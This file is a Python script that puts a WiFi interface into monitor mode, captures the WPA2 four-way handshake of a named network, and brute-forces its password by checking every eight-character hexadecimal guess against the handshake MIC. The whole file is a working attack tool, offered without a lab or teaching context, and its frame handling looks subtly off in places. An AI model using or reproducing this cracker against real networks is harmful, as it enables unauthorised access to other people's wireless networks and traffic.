import itertools
import socket
import os
import hashlib
import hmac
import sys
import time

BEACON_FRAME = b'\x80\x00'
ASSOCIATION_RESP_FRAME = b'\x10\x00'
HANDSHAKE_AP_FRAME = b'\x88\x02' # handshake message from access point (AP)
HANDSHAKE_STA_FRAME = b'\x88\x01' # handshake message from connecting device (STA)

WIFI_INTERFACE = 'wlp2s0' # Set this to whatever WiFi interface you want to use
SSID = 'TEST_SSID' # SSID of the network to use
PASSWORD_LIST = itertools.product('0123456789ABCDEF', repeat=8) # List of passwords to check

#Put WIFI interface into monitor mode
os.system('ifconfig {0} promisc && ifconfig {0} down && iwconfig {0} mode monitor && ifconfig {0} up'
          .format(WIFI_INTERFACE))
#create an INET, raw socket
sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))

association_init = False
handshake_counter = 0
ap_mac = None
sta_mac = None
ap_nonce = None
sta_nonce = None

"""
Function that performs the actual brute forcing of the WPA2 password
"""
def crack_wpa(ap_mac, sta_mac, ap_nonce, sta_nonce, eapol_frame_zeroed_mic, mic):

    # sorting function for byte strings
    def sort(in_1, in_2):
        if len(in_1) != len(in_2):
            raise 'lengths do not match!'
        in_1_byte_list = list(bytes(in_1))
        in_2_byte_list = list(bytes(in_2))

        for i in range(0, len(in_1_byte_list)):
            if in_1_byte_list[i] < in_2_byte_list[i]:
                return (in_2, in_1) # input 2 is bigger
            elif in_1_byte_list[i] > in_2_byte_list[i]:
                return (in_1, in_2) # input 1 is bigger
        return (in_1, in_2) # equal (shouldn't happen)

    max_mac, min_mac = sort(ap_mac, sta_mac)
    max_nonce, min_nonce = sort(ap_nonce, sta_nonce)

    message = b''.join([
        b'Pairwise key expansion\x00',
        min_mac,
        max_mac,
        min_nonce,
        max_nonce,
        b'\x00'
    ])

    for password_guess in PASSWORD_LIST: # try all the passwords
        password_guess = ''.join(password_guess).encode()

        pmk = hashlib.pbkdf2_hmac('sha1', password_guess, SSID.encode(), 4096, 32)
        kck = hmac.new(pmk, message, hashlib.sha1).digest()[:16]
        calculated_mic = hmac.new(kck, eapol_frame_zeroed_mic, hashlib.sha1).digest()[:16]

        if calculated_mic == mic:
            print('The password is: {}'.format(password_guess.decode('ASCII')))
            sys.exit(0)

    print('The password was not found')
    sys.exit(1)

# Continuously loop to read packets
while True:
    packet = sock.recvfrom(2048)[0]

    if packet[0:2] == b'\x00\x00': #radiotap header version 0
        radiotap_header_length = int(packet[2])
        packet = packet[radiotap_header_length:] #strip off radiotap header

        if packet != b'\x00\x00\x00\x00': #was getting weird frames with all zeroes, skip those
            frame_ctl = packet[0:2]
            duration = packet[2:4]
            address_1 = packet[4:10]
            address_2 = packet[10:16]
            address_3 = packet[16:22]
            sequence_control = packet[22:24]
            address_4 = packet[24:30]
            payload = packet[30:-4]
            crc = packet[-4:]

            if ap_mac is None and frame_ctl == BEACON_FRAME and SSID in str(payload):
                ap_mac = address_2
                print('Found MAC address of access point for {}: {}'.format(SSID, ap_mac.hex()))
                print('Waiting for a device to associate with the network...')

            # filter out unrelated packets
            elif ap_mac is not None and (address_1 == ap_mac or address_2 == ap_mac):
                if frame_ctl == ASSOCIATION_RESP_FRAME: #Association response
                    association_init = True
                    sta_mac = address_1
                    print('Association initiated')
                    print('Waiting for 4-way handshake...')

                elif association_init: #Association initiated, look for 4-way handshake
                    if frame_ctl == HANDSHAKE_AP_FRAME or frame_ctl == HANDSHAKE_STA_FRAME:
                        handshake_counter += 1
                        print('Received handshake {} of 4'.format(handshake_counter))

                        eapol_frame = payload[4:] #remove link layer

                        version = eapol_frame[0]
                        eapol_frame_type = eapol_frame[1]
                        body_length = eapol_frame[2:4]
                        key_type = eapol_frame[4]
                        key_info = eapol_frame[5:7]
                        key_length = eapol_frame[7:9]
                        replay_counter = eapol_frame[9:17]
                        nonce = eapol_frame[17:49]
                        key_iv = eapol_frame[49:65]
                        key_rsc = eapol_frame[65:73]
                        key_id = eapol_frame[73:81]
                        mic = eapol_frame[81:97]
                        wpa_key_length = eapol_frame[97:99]
                        wpa_key = eapol_frame[99:]

                        if handshake_counter == 1 and frame_ctl == HANDSHAKE_AP_FRAME:
                            ap_nonce = nonce
                        elif handshake_counter == 2 and frame_ctl == HANDSHAKE_STA_FRAME:
                            sta_nonce = nonce
                        elif handshake_counter == 3 and frame_ctl == HANDSHAKE_AP_FRAME:
                            continue
                        elif handshake_counter == 4 and frame_ctl == HANDSHAKE_STA_FRAME:
                            eapol_frame_zeroed_mic = b''.join([
                                eapol_frame[:81],
                                b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0',
                                eapol_frame[97:99]
                            ])

                            print('Attempting to find password...')
                            crack_wpa(ap_mac, sta_mac, ap_nonce, sta_nonce, eapol_frame_zeroed_mic, mic)
                        else: # reset all variables
                            association_init = False
                            handshake_counter = 0
                            ap_mac = None
                            sta_mac = None
                            ap_nonce = None
                            sta_nonce = None
